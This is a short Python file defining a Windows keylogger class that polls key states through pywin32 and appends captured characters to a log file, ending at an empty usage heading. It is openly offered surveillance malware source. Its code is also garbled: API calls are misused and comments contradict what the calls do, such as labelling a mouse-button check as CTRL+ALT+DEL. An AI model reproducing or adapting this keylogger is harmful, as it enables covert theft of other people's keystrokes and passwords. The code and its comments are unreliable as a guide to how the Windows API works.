import time
import win32api
import win32con

class KeyLogger:
    def __init__(self, filename="keyboard.log"):
        self.filename = filename
        self.handle = None
        self.buffer = ""

    def start(self):
        self.handle = win32api.CreateFile(
            self.filename,  # File to write to
            win32con.GENERIC_WRITE,  # Access type
            0,  # Open attributes
            None,  # Security attributes
            win32con.OPEN_EXISTING,  # Create flag
            0,  # Create flags
            None  # File creation attributes
        )
        if self.handle != 0:
            self.buffer = ""
            self.log_keystrokes()

    def stop(self):
        win32api.CloseHandle(self.handle)
        self.handle = None

    def log_keystrokes(self):
        while True:
            try:
                if self.handle:  
                    key = win32api.GetAsyncKeyState(0x01)  # Check for CTRL+ALT+DEL key
                    if key & 0x8000:  # Check for key pressed
                        self.buffer += chr(win32api.GetKeyState(0))  # Get ASCII code of pressed key
                        self.write_to_file()
                    else:  
                        time.sleep(0.1)  # Adjust delay for smoother execution

                else:
                    time.sleep(1)  # Wait for initialization

            except KeyboardInterrupt:
                break  # Stop on Ctrl+C


    def write_to_file(self):
        if self.buffer:
            with open(self.filename, "a") as f:
                f.write(self.buffer + "\n")
            self.buffer = ""  # Reset the buffer

    def reset(self):
        self.buffer = ""


# Example Usage:
